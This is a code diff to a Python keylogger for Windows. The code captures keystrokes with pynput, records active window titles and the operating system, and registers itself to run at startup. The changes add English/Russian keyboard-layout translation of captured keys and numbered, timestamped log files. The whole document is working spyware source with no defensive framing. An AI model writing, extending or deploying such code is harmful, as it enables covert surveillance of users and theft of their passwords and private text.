@@ -2,13 +2,37 @@ import datetime
 import platform
 import os
 import getpass
+import os.path
 
+from ctypes import *
 from datetime import datetime
 from pynput.keyboard import Key, Listener
 from win32com.client import Dispatch
 
+user32 = windll.user32
 USER_NAME = getpass.getuser()
 name_last_active_window = ""
+file_path = os.path.dirname(os.path.realpath(__file__))
+path = r"%s\logs" % file_path
+num_files = len([f for f in os.listdir(path)
+                if os.path.isfile(os.path.join(path, f))])
+
+hwnd = user32.GetForegroundWindow()
+threadID = user32.GetWindowThreadProcessId(hwnd, None)
+StartLang = user32.GetKeyboardLayout(threadID)
+
+eng_chars = u"~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
+rus_chars = u"ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"
+trans_table_en_ru = dict(zip(eng_chars, rus_chars))
+trans_table_ru_en = dict(zip(rus_chars, eng_chars))
+
+
+def change_en_ru(s):
+    return u''.join([trans_table_en_ru.get(c, c) for c in s])
+
+
+def change_ru_en(s):
+    return u''.join([trans_table_ru_en.get(c, c) for c in s])
 
 
 def add_to_startup():
@@ -40,7 +64,8 @@ def on_press(key):
 
 def write_file(key):
     global name_last_active_window
-    f = open("log.txt", "a", encoding='utf-8')
+    file = r"%s\log%s.txt" % (path, (num_files + 1))
+    f = open(file, "a", encoding='utf-8')
     f.write("\n")
     active_window = str(get_active_window())
 
@@ -53,7 +78,18 @@ def write_file(key):
         f.write("\n")
 
     name_last_active_window = active_window
+    hwnd = user32.GetForegroundWindow()
+    threadID = user32.GetWindowThreadProcessId(hwnd, None)
+    CodeLang = user32.GetKeyboardLayout(threadID)
     k = str(key).replace("'", "")
+    # 68748313 russian
+    # 67706880 english
+    if StartLang == 67706880:
+        if CodeLang == 68748313 and k.find("Key") == -1:
+            k = change_en_ru(k)
+    elif StartLang == 68748313:
+        if CodeLang == 67706880 and k.find("Key") == -1:
+            k = change_ru_en(k)
     now_time = datetime.now().time().replace(microsecond=0)
     f.write(str(now_time))
     f.write(' ')
@@ -69,7 +105,8 @@ def on_release(key):
 def main():
     add_to_startup()
     # add_to_startup(file_path="")
-    f = open("log.txt", "w", encoding='utf-8')
+    file = r"%s\log%s.txt" % (path, (num_files + 1))
+    f = open(file, "w", encoding='utf-8')
     f.write("Operating system: ")
     f.write(platform.platform())
     f.write("\n")
